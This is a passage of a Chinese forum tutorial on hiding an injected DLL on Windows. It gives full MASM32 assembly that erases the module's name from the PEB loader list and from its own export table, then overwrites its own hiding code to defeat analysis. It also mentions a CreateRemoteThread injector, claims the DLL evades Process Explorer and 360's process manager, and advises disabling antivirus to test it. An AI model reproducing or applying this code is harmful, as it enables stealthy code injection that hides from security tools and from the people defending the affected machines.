
也就是模块字串名称的指针。

要访问下一个`LDR_DATA_TABLE_ENTRY`，在上几句代码的基础上只需这样：

```
mov eax,[eax]   ;因为eax本身就是指向LIST_ENTRY结构地~~~，这样mov指令使得
                ;当前LIST_ENTRY的Flink传送到eax,eax自然就指向下一个LDR_DATA_TABLE_ENTRY结构了~~~
```

### (2)

好了说说我们的dll隐身技术，我们就是要将这里的`LDR_DATA_TABLE_ENTRY.FullDllName`指向的字符串清除！

因为快照函数或其它的函数，一般都会在底层访问这个结构，在这里查询模块的信息，我们把它给清除了，看它还能查到了吗？

下面我们假设我们已经使用`CreateRemoteThread`创建一个远程线程，远程线程入口就是`LoadLibraryA`函数，传入参数就是我们的欲注入的dll文件名，现在我们看看这个dll文件的核心代码，看它如何清除自己的`FullDllName`串实现隐藏：

```
;::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

DllEntry	proc	_hInstance,_dwReason,_dwReserved

		pushad

		mov	eax,_dwReason
		.if	eax == DLL_PROCESS_ATTACH			;Dll初始化时执行！
			push	_hInstance
			pop	hInstDll				;hInstDll保存本dll加载基址
			;------------------------------------------
			;定位eax指向首个LDR_DATA_TABLE_ENTRY结构
			;------------------------------------------
			assume	fs:nothing
			mov	eax,fs:[30h]				;eax-->PEB
			mov	eax,[eax + 0Ch]				;eax==Ldr-->PEB_LDR_DATA
			mov	eax,[eax + 0Ch]				;LoadOrderList.Flink-->LDR_DATA_TABLE_ENTRY
			;-----------------------------------------------------------
			;通过循环遍历LDR_DATA_TABLE_ENTRY结构,比较DllBase与hInstDll
			;找到描述本dll模块的LDR_DATA_TABLE_ENTRY结构
			;-----------------------------------------------------------
			@@:
			mov	ebx,[eax + 18h]				;[eax + 18h]为当前处理的模块的基址
			cmp	ebx,hInstDll				;找到本模块的LDR_DATA_TABLE_ENTRY
			jne	_No
			mov	ebx,[eax + 24h + 4]
			movzx	ecx,word ptr [eax + 24h]		;Unicode String length 获得子串长度
			mov	edi,ebx					;Unicode String Address 
			cld
			rep	stosb					;用Al的值填充
			mov	dword ptr [ebx],0			;(确保String首4个byte为0)
			jmp	@F
			_No:
			mov	eax,[eax]				;链表遍历
			jmp	@B
			@@:
		.elseif  -- - -- - - -- 
;::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::		
```

在`DllEntry`初始化时，响应`DLL_PROCESS_ATTACH`，在这其中清除我们的“自己的名字”，来个神不知鬼不觉！，哈哈～～

这同时也说明，初始化时，Windows已经把各结构都填写好了.

做到这里我们已经能实现这样的功能，即一般的进程查看工具看不到我们注入的dll了！

因为我们把它要查的信息清除了！

说到这可能有大牛说，我暴力搜索内存,匹配`MZ--PE`,看你往哪跑？ 的却我是跑不了 ~~

如果你这样做的话，首先你得知道我注入的是哪个进程，其次，你得有耐心暴力搜索，然后---真的被您搜到了---

此时我的 `dll` 的代码便可以被人家随便分析啦 ~~ 一看 哈哈，原来就是清除了某某结构的内容啊---

哼！ 我在你的导出表里找到你的 dll 名字！，然后找到你的磁盘文件，那你就任我鱼肉吧！ 哈哈哈哈~~~~~

好可怕啊~~~，是啊，用`OD`看看，然后静态反汇编一下，我们的代码就露馅了--唉--

等等！！

要不然 我们来个 **Self Modify** 将dll中的这段代码 也给它清除掉，对！ 还有 `EXPORT` 的那个 `dll` 名，一起除掉，给它来个毁尸灭迹 O(∩_∩)O哈哈~

说干就干，看下面代码:

```
;::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
DllEntry	proc	_hInstance,_dwReason,_dwReserved

		pushad
		mov	eax,_dwReason
		.if	eax == DLL_PROCESS_ATTACH

			push	_hInstance
			pop	hInstDll
	
		_BEGIN:
			call	@F
			@@:
			pop	eax					;eax返回@@标号处的线性地址
			sub	eax,5					;执行后eax等于_BEGIN处的线性地址
			push	eax
			mov	ebx,offset _END - offset _BEGIN
			invoke	VirtualProtect,eax,ebx,PAGE_EXECUTE_READWRITE,addr flOldProtect							;flOldProtect万万不可少
			;------------------------------------------
			;清除PEB结构中,(UNICODE STRING)FullDllName
			;------------------------------------------
			assume	fs:nothing
			mov	eax,fs:[30h]				;eax-->PEB
			mov	eax,[eax + 0Ch]				;eax==Ldr-->PEB_LDR_DATA
			mov	eax,[eax + 0Ch]				;LoadOrderList.Flink-->LDR_DATA_TABLE_ENTRY
			@@:
			mov	ebx,[eax + 18h]
			cmp	ebx,hInstDll				;找到本模块的LDR_DATA_TABLE_ENTRY
			jne	_No
			mov	ebx,[eax + 24h + 4]
			movzx	ecx,word ptr [eax + 24h]		;Unicode String length
			mov	edi,ebx					;Unicode String Address
			cld
			rep	stosb
			mov	dword ptr [ebx],0			;(确保String首4个byte为0)
			jmp	@F
			_No:
			mov	eax,[eax]
			jmp	@B
			@@:
			;---------------------------------
			;清除Dll映像中导出表中的Dll文件名
			;---------------------------------
			mov	esi,hInstDll
			add	esi,[esi + 03Ch]
			assume	esi:ptr IMAGE_NT_HEADERS
			mov	edi,[esi].OptionalHeader.DataDirectory[0].VirtualAddress
			add	edi,hInstDll
			assume	edi:ptr IMAGE_EXPORT_DIRECTORY
			mov	edi,[edi].nName
			add	edi,hInstDll					;edi-->DllName(Export)
			mov	[esp - 4*4],edi					
			xor	eax,eax
			mov	ecx,-1
			cld
			repnz	scasb						;[edi] != 0 -->> continue
			sub	edi,[esp - 4*4]					;edi == length + 1
			mov	[esp - 4*3],edi
			mov	dword ptr [esp - 4*2],PAGE_EXECUTE_READWRITE
			lea	eax,flOldProtect
			mov	[esp - 4*1],eax
			sub	esp,4*4
			call	VirtualProtect					;调用VirtualProtect更改页属性
			xor	eax,eax
			xchg	ecx,edi						;edi == length + 1			
			xchg	edi,[esp - 4*4]					;[esp - 4*4] --> DllName
			cld
			rep	stosb
			;-------------------------------------
			;将_BEGIN 与 _END 之间内容填充为int 3
			;-------------------------------------
			pop	edi
			mov	eax,0CCh
			mov	ecx,offset _END - offset _BEGIN
			cld
			rep	stosb
		_END:

			;--------------------------------------------
			;创建自定义线程,you can do anything you want
			;--------------------------------------------
			invoke	CreateThread,0,0,addr _ThreadProc,0,0,0

		.elseif eax == DLL_PROCESS_DETACH
			NOP
		.endif

		popad
		mov	eax,TRUE
		ret

DllEntry	Endp
;::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
```

这最后一部分就是 `Dll` 的完全的核心代码啦 ~~~ 调用`VirtualProtectl`两次，第一次用于更改 `_BEGIN`与`_END`标号处的属性，以便毁尸灭迹填充 `int 3`.第二次用于更改导出表dll文件名的地方的属性，以便将其清零.

最后程序可以创建个自定义线程，在这个线程里 you can do anything you like

;/////////////////////////////////////////////////////////////////////////////////////////////

至此，我们的工程完成啦 ~~~ ，即使搜索内存字符串也是搜不到的--因为所有的相关串都被我们毁了

## 我测试环境是 Win 7，ProcessExplorer 和 360自带的 进程管理器 都查不出来 已加载的Dll模块.##

## 冰刃的话说是不支持win 7 因此未测试，不知结果不敢妄言##

好了说说我们的附件：

你可以看到本文使用的是 `MASM32` 的语法

附件中有完整的 `dll` 文件的源代码，还有编译好的 `dll` 文件。

为了测试程序的方便我还特意用 `ASM` 写了个控制台程序，这个控制台程序是个"`dll` 注入器"

采用`CreateRemoteThread`的方式注入，你可以输入进程名来完成注入，以便测试我们的这个dll

这个控台程序的源码同样在附件中.

**注意:**注入前 `dll` 文件要放在 `PATH` 变量指定的目录中，否则`LoadLibraryA`找不到dll会失败

`dll`成功注入后首先会弹出个`MessageBox`，告诉你，它被 Loaded 了，然后 自定义线程

会 每隔 6 秒弹出一个 `MessgeBox`,告诉你 It is alive ！

**注**：由于涉及到远程注入，因此部分杀软会报毒的，如果想继续测试，请暂时关闭 进程防火墙 或 其它可能的主动防御

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [LIST_ENTRY.png](javascript:void(0);)
  （9.17kb，2793次下载）
- [HideDll.rar](javascript:void(0);)
  （5.48kb，761次下载）
